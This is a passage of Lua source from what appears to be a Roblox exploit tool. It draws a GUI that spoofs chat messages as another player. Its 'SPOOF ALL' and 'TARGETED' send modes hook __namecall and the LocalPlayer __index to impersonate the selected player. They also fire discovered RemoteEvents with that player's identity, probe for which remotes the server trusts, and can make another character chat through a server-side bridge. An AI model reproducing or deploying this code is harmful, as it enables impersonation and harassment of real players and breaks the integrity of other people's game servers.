local function setModeNote() modeNoteL.Text=MNOTES[modeIdx] or "" end

local modeRow=mkF(RIGHT,UDim2.new(1,-14,0,30),UDim2.new(0,7,0,74),CD,0.50)
corner(modeRow,8);modeRow.ClipsDescendants=true
for i,name in ipairs(MODES) do
    local pct=(i-1)/#MODES
    local mb=mkF(modeRow,UDim2.new(1/#MODES,0,1,0),UDim2.new(pct,0,0,0),AC,i==1 and 0.72 or 1)
    if i==1 then corner(mb,8) elseif i==#MODES then corner(mb,8) end
    local ml=mkL(mb,name,9,i==1 and T1 or T3,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,i==1)
    local mh=mkB(modeRow,UDim2.new(1/#MODES,0,1,0),UDim2.new(pct,0,0,0),AC,1);mh.ZIndex=2
    local ci=i
    mh.MouseButton1Click:Connect(function()
        modeIdx=ci;setModeNote()
        for j,bt in ipairs(modeBtns) do
            tw(bt.bg,TF,{BackgroundTransparency=j==ci and 0.72 or 1})
            bt.lbl.Font=j==ci and Enum.Font.GothamBold or Enum.Font.Gotham
            bt.lbl.TextColor3=j==ci and T1 or T3
        end
    end)
    table.insert(modeBtns,{bg=mb,lbl=ml})
end
setModeNote()

-- Remote list
mkL(RIGHT,"REMOTES",8,T3,UDim2.new(0,10,0,112),UDim2.new(1,-80,0,12),Enum.TextXAlignment.Left,true)
mkF(RIGHT,UDim2.new(1,-14,0,1),UDim2.new(0,7,0,124),AC,0.70)
local rsBg=mkF(RIGHT,UDim2.new(0,58,0,18),UDim2.new(1,-65,0,110),AC,0.72);corner(rsBg,7)
mkL(rsBg,"⟳ Scan",9,T1,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,true)
local rsHit=mkB(RIGHT,UDim2.new(0,58,0,18),UDim2.new(1,-65,0,110),AC,1);rsHit.ZIndex=2

local remScroll=Instance.new("ScrollingFrame")
remScroll.Size=UDim2.new(1,-14,0,80);remScroll.Position=UDim2.new(0,7,0,128)
remScroll.BackgroundTransparency=1;remScroll.BorderSizePixel=0
remScroll.ScrollBarThickness=3;remScroll.ScrollBarImageColor3=AC
remScroll.CanvasSize=UDim2.new(0,0,0,0);remScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
remScroll.ScrollingDirection=Enum.ScrollingDirection.Y;remScroll.Parent=RIGHT
Instance.new("UIListLayout",remScroll).Padding=UDim.new(0,2)
local remEmptyL=mkL(remScroll,"Press ⟳ Scan to find remotes",10,T3,
    UDim2.new(0,0,0,0),UDim2.new(1,0,0,26),Enum.TextXAlignment.Center,false)

local selectedRemote=nil
local remoteBtns={}

local function selectRemote(re)
    selectedRemote=re
    for r,btn in pairs(remoteBtns) do
        local on=(r==re)
        tw(btn.bg,TF,{BackgroundTransparency=on and 0.14 or (trustedRemotes[r] and 0.20 or 0.60)})
        if not trustedRemotes[r] then
            btn.lbl.TextColor3=on and T1 or T2
            btn.lbl.Font=on and Enum.Font.GothamBold or Enum.Font.Gotham
        end
    end
end

local statusL  -- forward declared; assigned below

local function markTrusted(remote, method)
    if trustedRemotes[remote] then return end
    trustedRemotes[remote]=method or "confirmed"
    if remoteBtns[remote] then
        local btn=remoteBtns[remote]
        btn.lbl.Text="✓ "..remote.Name
        btn.lbl.TextColor3=GRN;btn.lbl.Font=Enum.Font.GothamBold
        tw(btn.bg,TF,{BackgroundTransparency=0.10})
    end
    if statusL then statusL.Text="TRUSTED: "..remote.Name.." via "..tostring(method);statusL.TextColor3=GRN end
    notify("Trusted Remote!",remote.Name.." via "..tostring(method),7)
    modeIdx=4;setModeNote()
    for j,bt in ipairs(modeBtns) do
        tw(bt.bg,TF,{BackgroundTransparency=j==4 and 0.72 or 1})
        bt.lbl.Font=j==4 and Enum.Font.GothamBold or Enum.Font.Gotham
        bt.lbl.TextColor3=j==4 and T1 or T3
    end
    selectRemote(remote)
end

local function rebuildRemoteList(found)
    for _,btn in pairs(remoteBtns) do btn.bg:Destroy() end;remoteBtns={}
    remEmptyL.Parent=nil
    if #found==0 then remEmptyL.Text="None found";remEmptyL.Parent=remScroll;return end
    for _,re in ipairs(found) do
        local isCR=false; for _,v in ipairs(chatRemotes) do if v==re then isCR=true;break end end
        local isTR=trustedRemotes[re]~=nil
        local rowBg=mkF(remScroll,UDim2.new(1,0,0,22),UDim2.new(0,0,0,0),CD,isTR and 0.10 or 0.60)
        corner(rowBg,6);rowBg.ClipsDescendants=true
        stroke(rowBg,isTR and GRN or (isCR and AC or Color3.new(1,1,1)),isTR and 0.28 or (isCR and 0.50 or 0.88),1)
        local dot=mkF(rowBg,UDim2.new(0,5,0,5),UDim2.new(0,5,0.5,-2),isTR and GRN or (isCR and AC or T3),0);corner(dot,3)
        local lbl=mkL(rowBg,isTR and "✓ "..re.Name or re.Name,9,isTR and GRN or T2,UDim2.new(0,14,0,0),UDim2.new(1,-18,1,0),Enum.TextXAlignment.Left,isTR)
        local hit=mkB(rowBg,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),CD,1)
        local r=re
        hit.MouseButton1Click:Connect(function() selectRemote(r) end)
        hit.MouseEnter:Connect(function() if selectedRemote~=r then tw(rowBg,TF,{BackgroundTransparency=0.36}) end end)
        hit.MouseLeave:Connect(function() if selectedRemote~=r then tw(rowBg,TM,{BackgroundTransparency=trustedRemotes[r] and 0.10 or 0.60}) end end)
        remoteBtns[re]={bg=rowBg,lbl=lbl,dot=dot}
    end
    if not selectedRemote then
        for r in pairs(trustedRemotes) do selectRemote(r);break end
        if not selectedRemote and #chatRemotes>0 then selectRemote(chatRemotes[1]) end
    end
end

local function doScan()
    remEmptyL.Text="scanning…";remEmptyL.Parent=remScroll
    for _,btn in pairs(remoteBtns) do btn.bg:Destroy() end;remoteBtns={}
    task.spawn(function() rebuildRemoteList(scanAll()) end)
end
rsHit.MouseEnter:Connect(function() tw(rsBg,TF,{BackgroundTransparency=0.44}) end)
rsHit.MouseLeave:Connect(function() tw(rsBg,TM,{BackgroundTransparency=0.72}) end)
rsHit.MouseButton1Click:Connect(doScan)
task.spawn(doScan)

-- Message box
mkL(RIGHT,"MESSAGE",8,T3,UDim2.new(0,10,0,216),UDim2.new(1,-10,0,12),Enum.TextXAlignment.Left,true)
mkF(RIGHT,UDim2.new(1,-14,0,1),UDim2.new(0,7,0,228),AC,0.70)
local msgCard=mkF(RIGHT,UDim2.new(1,-14,1,-276),UDim2.new(0,7,0,234),CD,0.40)
corner(msgCard,10);msgCard.ClipsDescendants=true;stroke(msgCard,Color3.new(1,1,1),0.82,1)
local mPad=Instance.new("UIPadding",msgCard)
mPad.PaddingLeft=UDim.new(0,10);mPad.PaddingRight=UDim.new(0,8)
mPad.PaddingTop=UDim.new(0,7);mPad.PaddingBottom=UDim.new(0,7)
local msgBox=Instance.new("TextBox")
msgBox.PlaceholderText="Type message…";msgBox.Text=""
msgBox.Font=Enum.Font.Gotham;msgBox.TextSize=13
msgBox.TextColor3=T1;msgBox.PlaceholderColor3=T3
msgBox.BackgroundTransparency=1;msgBox.BorderSizePixel=0
msgBox.Size=UDim2.new(1,0,1,0);msgBox.ClearTextOnFocus=false
msgBox.MultiLine=true;msgBox.TextXAlignment=Enum.TextXAlignment.Left
msgBox.TextYAlignment=Enum.TextYAlignment.Top;msgBox.TextWrapped=true
msgBox.Parent=msgCard
msgBox.Focused:Connect(function()  tw(msgCard,TF,{BackgroundTransparency=0.24}) end)
msgBox.FocusLost:Connect(function() tw(msgCard,TM,{BackgroundTransparency=0.40}) end)

statusL=mkL(RIGHT,"",10,T3,UDim2.new(0,10,1,-94),UDim2.new(1,-14,0,20),Enum.TextXAlignment.Left,false,true)

local clrCard=mkF(RIGHT,UDim2.new(0,62,0,34),UDim2.new(0,7,1,-68),CD,0.50)
corner(clrCard,9);stroke(clrCard,Color3.new(1,1,1),0.84,1)
mkL(clrCard,"⌫ Clear",11,T2,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,false)
local clrHit=mkB(clrCard,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),CD,1)
clrHit.MouseEnter:Connect(function() tw(clrCard,TF,{BackgroundTransparency=0.28}) end)
clrHit.MouseLeave:Connect(function() tw(clrCard,TM,{BackgroundTransparency=0.50}) end)
clrHit.MouseButton1Click:Connect(function()
    msgBox.Text="";statusL.Text="";statusL.TextColor3=T3
end)
local sendCard=mkF(RIGHT,UDim2.new(1,-80,0,34),UDim2.new(0,74,1,-68),AC,0.12)
corner(sendCard,9);stroke(sendCard,AC,0.44,1.5)
mkF(sendCard,UDim2.new(1,-2,0,1),UDim2.new(0,1,0,1),Color3.new(1,1,1),0.80)
local sendLbl=mkL(sendCard,"▶  Send",13,T1,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,true)
local sendHit=mkB(sendCard,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),AC,1)
sendHit.MouseEnter:Connect(function() tw(sendCard,TF,{BackgroundTransparency=0}) end)
sendHit.MouseLeave:Connect(function() tw(sendCard,TM,{BackgroundTransparency=0.12}) end)

-- Player list
local selectedPlayer=nil
local playerBtns={}
local function setStatus(msg,ok)
    local col=ok==true and GRN or (ok==nil and ORG or RED)
    statusL.Text=msg;statusL.TextColor3=col
    task.delay(6,function() if statusL.Text==msg then statusL.Text="";statusL.TextColor3=T3 end end)
end
local function selectPlayer(plr)
    selectedPlayer=plr
    selL.Text=plr and (plr.DisplayName.." · @"..plr.Name) or "— tap a player —"
    selL.TextColor3=plr and T1 or T2
    for p,r in pairs(playerBtns) do
        local on=(p==plr)
        tw(r.bg,TF,{BackgroundTransparency=on and 0.16 or 0.68})
        r.lbl.Font=on and Enum.Font.GothamBold or Enum.Font.Gotham
        r.lbl.TextColor3=on and T1 or T2
        r.dot.BackgroundTransparency=on and 0 or 0.80
    end
end
local function buildRow(plr)
    if playerBtns[plr] then return end
    local row=mkF(plScroll,UDim2.new(1,0,0,42),UDim2.new(0,0,0,0),CD,0.68)
    row.ClipsDescendants=true;corner(row,9);stroke(row,Color3.new(1,1,1),0.86,1)
    local bar=mkF(row,UDim2.new(0,3,1,-10),UDim2.new(0,0,0,5),AC,0);corner(bar,2)
    local av=mkF(row,UDim2.new(0,28,0,28),UDim2.new(0,8,0.5,-14),AC,0.52);corner(av,14)
    mkL(av,plr.Name:sub(1,1):upper(),13,T1,UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Enum.TextXAlignment.Center,true)
    local nl=mkL(row,plr.DisplayName,12,T2,UDim2.new(0,42,0,5),UDim2.new(1,-50,0,14),Enum.TextXAlignment.Left,false)
    mkL(row,"@"..plr.Name,9,T3,UDim2.new(0,42,0,22),UDim2.new(1,-50,0,13),Enum.TextXAlignment.Left,false)
    local dot=mkF(row,UDim2.new(0,6,0,6),UDim2.new(1,-12,0.5,-3),AC,0.80);corner(dot,3)
    local hit=mkB(row,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),CD,1)
    hit.MouseEnter:Connect(function() if selectedPlayer~=plr then tw(row,TF,{BackgroundTransparency=0.48}) end end)
    hit.MouseLeave:Connect(function() if selectedPlayer~=plr then tw(row,TF,{BackgroundTransparency=0.68}) end end)
    hit.MouseButton1Click:Connect(function()
        if selectedPlayer==plr then selectPlayer(nil) else selectPlayer(plr) end
    end)
    playerBtns[plr]={bg=row,lbl=nl,dot=dot,bar=bar}
end
local function removeRow(plr)
    if playerBtns[plr] then playerBtns[plr].bg:Destroy();playerBtns[plr]=nil end
    if selectedPlayer==plr then selectPlayer(nil) end
end
for _,p in ipairs(Players:GetPlayers()) do buildRow(p) end
Players.PlayerAdded:Connect(buildRow)
Players.PlayerRemoving:Connect(removeRow)

-- Bridge status poll
task.spawn(function()
    while SG and SG.Parent do
        local online = Bridge ~= nil and Bridge.Parent ~= nil
        bDot.BackgroundColor3 = online and GRN or RED
        bLbl.Text             = online and "SS online" or "SS offline"
        bLbl.TextColor3       = online and GRN or RED
        bPillStroke.Color     = online and GRN or T3
        bPillStroke.Transparency = online and 0.42 or 0.60
        task.wait(2)
    end
end)

-- Send
local function doSend()
    local msg=msgBox.Text:match("^%s*(.-)%s*$")
    if msg=="" then setStatus("Type a message first.",false);return end

    if modeIdx==1 then
        -- SERVER: via SS bridge (Chat:Chat server-side)
        if not Bridge then setStatus("SS offline — run this script server-side first.",false);return end
        if not selectedPlayer then setStatus("Select a player first.",false);return end
        local res=callBridge("chat",{target=selectedPlayer.Name, message=msg, display=selectedPlayer.DisplayName})
        if res and res.ok then setStatus("Server: "..res.msg,true);notify("SS Chat",res.msg,4)
        else setStatus("SS error: "..(res and res.msg or "failed"),false) end

    elseif modeIdx==2 then
        -- AS ME: GUI sim → TextChatService → old chat → chat remotes
        local sent, method = false, ""
        if not sent then local ok,m=tryGUISimulate(msg); if ok then sent=true;method=m end end
        if not sent then pcall(function()
            local channels=TCS:FindFirstChild("TextChannels"); if not channels then return end
            local ch=channels:FindFirstChild("RBXGeneral")
            if not ch then for _,v in ipairs(channels:GetChildren()) do if v:IsA("TextChannel") then ch=v;break end end end
            if not ch then return end
            ch:SendAsync(msg); sent=true; method="TextChatService"
        end) end
        if not sent then pcall(function()
            local dce=RS:FindFirstChild("DefaultChatSystemChatEvents") or RS:FindFirstChild("ChatEvents")
            if not dce then return end
            local req=dce:FindFirstChild("SayMessageRequest") or dce:FindFirstChild("SendMessage")
            if not req then return end
            req:FireServer({Message=msg, Type="Say"}); sent=true; method="SayMessageRequest"
        end) end
        if not sent and #chatRemotes>0 then
            for _,re in ipairs(chatRemotes) do
                pcall(function() re:FireServer(msg) end)
                pcall(function() re:FireServer(LP.Name, msg) end)
                pcall(function() re:FireServer({Message=msg, Type="Say"}) end)
            end
            sent=true; method="chat remotes ("..#chatRemotes..")"
        end
        if sent then setStatus("Sent via "..method.." ✓",true);notify("Sent!","via "..method,3)
        else setStatus("All client methods failed.",false) end

    elseif modeIdx==3 then
        -- SPOOF ALL: hooks + all remotes + GUI sim
        if not selectedPlayer then setStatus("Select a player first.",false);return end
        local display=selectedPlayer.DisplayName; local uname=selectedPlayer.Name
        local hookMethods={}
        if hookNamecall(display,uname) then table.insert(hookMethods,"__namecall") end
        if hookLPName(display,uname)   then table.insert(hookMethods,"LP.__index") end
        local guiOk,guiMethod=tryGUISimulate(msg)
        local fired=0
        for _,remote in ipairs(allRemotes) do
            local r=remote
            watchForTrust(r,selectedPlayer,msg,function(m) markTrusted(r,m) end)
            firePatterns(r,uname,display,msg)
            fired=fired+1
        end
        local char=selectedPlayer.Character
        if char then pcall(function() ChatSvc:Chat(char,msg,Enum.ChatColor.White) end) end
        task.delay(1,unhookAll)
        local parts={}
        if #hookMethods>0 then table.insert(parts,"hooks("..table.concat(hookMethods,"+")..") ✓") end
        if guiOk         then table.insert(parts,"GUI("..guiMethod..") ✓") end
        if fired>0       then table.insert(parts,fired.." remotes") end
        setStatus(table.concat(parts," · "),#parts>0 and nil or false)

    elseif modeIdx==4 then
        -- TARGETED: one remote + hooks
        if not selectedPlayer then setStatus("Select a player first.",false);return end
        if not selectedRemote then setStatus("Select a remote from the list.",false);return end
        local display=selectedPlayer.DisplayName; local uname=selectedPlayer.Name
        hookNamecall(display,uname); hookLPName(display,uname)
        watchForTrust(selectedRemote,selectedPlayer,msg,function(m) markTrusted(selectedRemote,m) end)
        firePatterns(selectedRemote,uname,display,msg)
        tryGUISimulate(msg)
        local char=selectedPlayer.Character
        if char then pcall(function() ChatSvc:Chat(char,msg,Enum.ChatColor.White) end) end
        task.delay(1,unhookAll)
        setStatus("Fired \""..selectedRemote.Name.."\" as \""..display.."\" + hooks",nil)
    end

    sendLbl.Text="✓  Sent";tw(sendCard,TF,{BackgroundTransparency=0})
    task.delay(1.6,function() sendLbl.Text="▶  Send";tw(sendCard,TM,{BackgroundTransparency=0.12}) end)
end

sendHit.MouseButton1Click:Connect(doSend)
msgBox.FocusLost:Connect(function(enter) if enter then doSend() end end)

WIN.Size=UDim2.new(0,W*0.86,0,H*0.86);WIN.BackgroundTransparency=1
tw(WIN,TweenInfo.new(0.48,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{
    Size=UDim2.new(0,W,0,H),BackgroundTransparency=0.18
})
